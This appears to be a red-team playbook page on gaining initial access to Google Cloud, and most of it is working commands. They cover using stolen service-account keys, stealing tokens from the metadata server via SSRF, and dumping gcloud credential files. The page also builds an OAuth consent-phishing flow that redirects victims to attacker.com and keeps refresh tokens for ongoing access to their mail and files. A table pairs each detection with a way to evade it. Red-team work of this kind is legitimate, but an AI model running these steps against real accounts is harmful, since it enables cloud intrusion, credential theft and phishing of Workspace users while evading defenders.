# GCP Initial Access
> **MITRE ATT&CK**: Initial Access > T1078.004 - Valid Accounts: Cloud Accounts
> **Platforms**: GCP (Google Cloud Platform)
> **Required Privileges**: None (external) to Low
> **OPSEC Risk**: Medium

## Strategic Overview

GCP initial access centers on service account key compromise, metadata server exploitation,
and misconfigured public-facing services. GCP's identity model differs from AWS and Azure
in important ways: service accounts are the primary non-human identities, Workload Identity
Federation replaces long-lived keys, and Google Workspace integration means compromising
a Workspace admin can cascade into GCP project control. A red team lead must understand
that GCP's default service account behavior historically granted Editor to compute
instances, creating a massive implicit privilege surface.

## Technical Deep-Dive

### Service Account Key File Leaks

```bash
# GCP service account keys are JSON files containing private keys
# Common leak locations: Git repos, CI/CD configs, container images, backups

# Structure of a leaked key file:
# {
#   "type": "service_account",
#   "project_id": "target-project",
#   "private_key_id": "abc123",
#   "private_key": "-----BEGIN RSA PRIVATE KEY-----\n...",
#   "client_email": "sa-name@target-project.iam.gserviceaccount.com",
#   "client_id": "123456789",
#   ...
# }

# Authenticate with a stolen key file
gcloud auth activate-service-account --key-file=stolen-key.json
gcloud config set project target-project

# Verify identity
gcloud auth list
gcloud config list

# Search for keys in repositories
trufflehog git https://github.com/target/repo --only-verified
# Regex pattern for GCP SA keys: "private_key_id".*"private_key"

# Search for keys in Docker images
docker save target-image:latest | tar -xO | grep -r "private_key"
```

### Metadata Server SSRF

```bash
# GCP metadata server requires a specific header (unlike IMDSv1 on AWS)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/"

# Get the default service account token
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Returns: {"access_token":"ya29.c.xxx","expires_in":3599,"token_type":"Bearer"}

# Get all service account scopes (determines what token can do)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"

# Get project-level metadata (may contain SSH keys, startup scripts)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/project/attributes/"

# Get instance-level attributes
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/"

# Kubernetes on GKE - access from pod
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# SSRF bypass: The header requirement blocks simple redirects
# But if the app adds custom headers or you control the request fully, it works
# Some libraries (urllib in Python) follow redirects and preserve headers
```

### OAuth Consent Phishing for Google Workspace

```bash
# Register a GCP OAuth application
# Request scopes: drive.readonly, gmail.readonly, admin.directory.user.readonly

# Generate OAuth consent URL
CONSENT_URL="https://accounts.google.com/o/oauth2/v2/auth?\
client_id=ATTACKER_CLIENT_ID&\
redirect_uri=https://attacker.com/callback&\
response_type=code&\
scope=https://www.googleapis.com/auth/drive.readonly%20\
https://www.googleapis.com/auth/gmail.readonly&\
access_type=offline&\
prompt=consent"

# After victim authorizes, exchange code for tokens
curl -X POST https://oauth2.googleapis.com/token \
  -d "code=AUTH_CODE&client_id=CLIENT_ID&client_secret=SECRET&\
redirect_uri=https://attacker.com/callback&grant_type=authorization_code"

# Use refresh token for persistent access to victim's data
curl -X POST https://oauth2.googleapis.com/token \
  -d "refresh_token=REFRESH_TOKEN&client_id=CLIENT_ID&\
client_secret=SECRET&grant_type=refresh_token"
```

### Default Service Account Exploitation

```bash
# GCP historically assigns default SA with Editor role to Compute/GKE
# Check what SA is attached to current instance
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"

# The default Compute Engine SA format: PROJECT_NUMBER-compute@developer.gserviceaccount.com
# With Editor role, this SA can: modify resources, read secrets, create instances, etc.

# Test access with the token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

# Use token against GCP APIs
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

curl -H "Authorization: Bearer $TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/PROJECT/zones/us-central1-a/instances"
```

### GCloud CLI Credential Theft

```bash
# GCP CLI stores credentials in well-known locations
# Application Default Credentials
cat ~/.config/gcloud/application_default_credentials.json

# Active account credentials (SQLite database)
ls ~/.config/gcloud/credentials.db
sqlite3 ~/.config/gcloud/credentials.db "SELECT * FROM credentials;"

# Access tokens cache
cat ~/.config/gcloud/access_tokens.db

# Legacy credentials file
cat ~/.config/gcloud/properties
cat ~/.config/gcloud/legacy_credentials/*/adc.json

# Service account keys used via CLI
cat ~/.config/gcloud/configurations/config_default
# Check for: account = sa@project.iam.gserviceaccount.com
```

### GCS Bucket Misconfiguration

```bash
# Check for publicly accessible buckets
curl -s "https://storage.googleapis.com/TARGET_BUCKET"
gsutil ls gs://target-bucket/ 2>/dev/null

# Anonymous access test
curl -s "https://storage.googleapis.com/storage/v1/b/TARGET_BUCKET/o?alt=json"

# allUsers / allAuthenticatedUsers ACL check
gsutil iam get gs://target-bucket/
# Look for: allUsers with roles/storage.objectViewer

# Download public objects
gsutil cp gs://target-bucket/config.yml .
curl -O "https://storage.googleapis.com/TARGET_BUCKET/secrets.env"
```

### Cloud Function and Cloud Run URL Exposure

```bash
# Cloud Functions with --allow-unauthenticated
gcloud functions list --format="table(name,httpsTrigger.url,status)"
curl -s "https://REGION-PROJECT.cloudfunctions.net/FUNCTION_NAME"

# Cloud Run services open to the internet
gcloud run services list --format="table(name,URL,status)"
curl -s "https://SERVICE-HASH.run.app/"

# Check IAM for allUsers invoker
gcloud functions get-iam-policy FUNCTION_NAME
gcloud run services get-iam-policy SERVICE_NAME
# Look for: roles/cloudfunctions.invoker -> allUsers
```

### Workload Identity Federation Abuse

```bash
# WIF allows external identities (AWS, Azure, OIDC) to impersonate GCP SAs
# If you compromise an AWS role that is federated to GCP:

# Step 1: Get AWS STS token
AWS_TOKEN=$(aws sts get-caller-identity --query "Account" -o text)

# Step 2: Exchange for GCP access token
curl -X POST "https://sts.googleapis.com/v1/token" \
  -H "Content-Type: application/json" \
  -d '{
    "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
    "audience": "//iam.googleapis.com/projects/PROJECT_NUM/locations/global/workloadIdentityPools/POOL/providers/PROVIDER",
    "scope": "https://www.googleapis.com/auth/cloud-platform",
    "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
    "subjectToken": "AWS_SIGNED_TOKEN",
    "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt"
  }'
```

## Detection & Evasion

| Access Vector                 | Detection                         | Evasion                                  |
|-------------------------------|-----------------------------------|------------------------------------------|
| SA key authentication         | Cloud Audit Logs: AuthN events    | Use from expected network ranges         |
| Metadata SSRF                 | VPC Flow Logs (metadata IP)       | Normal from within instance              |
| OAuth consent phishing        | Admin console: App audit          | Request minimal scopes initially         |
| Default SA abuse              | Audit Logs: unusual API calls     | Stick to expected API patterns           |
| CLI credential theft          | Endpoint detection on workstation | Exfiltrate DB, don't use in-place       |
| Bucket misconfiguration       | Access Logs on bucket             | Single targeted download, not ls         |

## Cross-References

- [GCP Privilege Escalation](gcp-privilege-escalation.md)
- [GCP Persistence](gcp-persistence.md)
- [Cloud Attack Methodology](../cloud-methodology.md)
- [Cloud Tools Reference](../cloud-tools.md)

## References

- https://cloud.google.com/compute/docs/metadata/overview
- https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges/
- https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/
- https://hackingthe.cloud/gcp/general-knowledge/
